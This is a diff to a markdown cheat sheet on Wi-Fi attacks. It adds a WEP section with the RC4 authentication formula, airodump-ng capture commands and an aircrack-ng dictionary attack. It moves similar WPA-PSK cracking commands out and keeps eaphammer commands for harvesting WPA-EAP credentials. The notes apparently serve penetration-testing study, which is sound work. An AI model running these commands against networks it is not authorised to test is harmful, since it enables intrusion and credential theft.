@@ -273,6 +273,36 @@ sudo wireshark&
 
 - https://dl.aircrack-ng.org/breakingwepandwpa.pdf
 
+## WEP
+
+- https://tbhaxor.com/decrypt-wep-traffic-with-insufficient-ivs/
+
+*Authentification*
+```txt
+response = challenge ^ RC4(iv|psk)
+
+iv = 24 bits
+key = iv|psk
+psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
+psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
+```
+
+*Capture*
+
+```bash
+sudo su
+airmon-ng start wlan0 #set monitor & rename wlan0 (wlan0mon)
+airodump-ng wlan0mon #scan network
+airodump-ng --bssid 68:A3:78:01:C9:EF -w wep wlan0mon #find bssid (last command) , -w = prefix name
+airodump-ng stop wlan0mon #set back monitor->managed
+```
+
+*Bruteforce*
+
+```bash
+aircrack-ng -w rockyou.txt -b 68:A3:78:01:C9:EF -n 128 wep-01.*cap # -n lenght key
+```
+
 ## WPA - PSK
 
 ```bash
@@ -288,16 +318,6 @@ https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-th
 
 https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 
-```bash
-sudo su
-airmon-ng start wlan0 #set monitor & rename wlan0 (wlan0mon)
-airodump-ng wlan0mon #scan network
-airodump-ng --bssid 68:A3:78:01:C9:EF -w psk wlan0mon #find bssid (last command)
-airodump-ng stop wlan0mon #set back monitor->managed
-
-#offline
-aircrack-ng -w rockyou.txt -b 68:A3:78:01:C9:EF psk-01.*cap
-```
 
 ## WPA - EAP
 
@@ -305,5 +325,3 @@ aircrack-ng -w rockyou.txt -b 68:A3:78:01:C9:EF psk-01.*cap
 sudo python3 ./eaphammer –cert-wizard
 sudo python3 ./eaphammer -i wlan6 --creds -e "xxx" -b xx:xx:xx:xx:xx:xx #BSSID /MAC
 ```
-
-
